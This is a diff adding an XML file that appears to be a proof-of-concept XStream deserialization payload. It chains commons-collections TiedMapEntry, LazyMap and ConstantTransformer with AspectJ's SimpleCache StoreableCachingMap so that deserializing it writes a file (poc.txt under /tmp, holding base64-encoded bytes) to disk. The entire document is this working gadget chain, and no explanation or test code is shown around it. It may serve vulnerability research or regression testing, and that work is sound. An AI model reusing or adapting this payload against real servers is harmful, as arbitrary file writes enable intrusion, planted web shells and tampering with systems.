@@ -1,0 +1,33 @@
+<set>
+        <org.apache.commons.collections.keyvalue.TiedMapEntry>
+                <map class="org.apache.commons.collections.map.LazyMap" serialization="custom">
+                        <unserializable-parents/>
+                        <org.apache.commons.collections.map.LazyMap>
+                                <default>
+                                        <factory class="org.apache.commons.collections.functors.ConstantTransformer">
+                                                <iConstant class="byte-array">UG9DCg==</iConstant>
+                                        </factory>
+                                </default>
+                                <org.aspectj.weaver.tools.cache.SimpleCache_-StoreableCachingMap serialization="custom">
+                                        <unserializable-parents/>
+                                        <map>
+                                                <default>
+                                                        <loadFactor>0.75</loadFactor>
+                                                        <threshold>0</threshold>
+                                                </default>
+                                                <int>16</int>
+                                                <int>0</int>
+                                        </map>
+                                        <org.aspectj.weaver.tools.cache.SimpleCache_-StoreableCachingMap>
+                                                <default>
+                                                        <lastStored>1629449834911</lastStored>
+                                                        <storingTimer>12</storingTimer>
+                                                        <folder>/tmp</folder>
+                                                </default>
+                                        </org.aspectj.weaver.tools.cache.SimpleCache_-StoreableCachingMap>
+                                </org.aspectj.weaver.tools.cache.SimpleCache_-StoreableCachingMap>
+                        </org.apache.commons.collections.map.LazyMap>
+                </map>
+                <key class="string">poc.txt</key>
+        </org.apache.commons.collections.keyvalue.TiedMapEntry>
+</set>
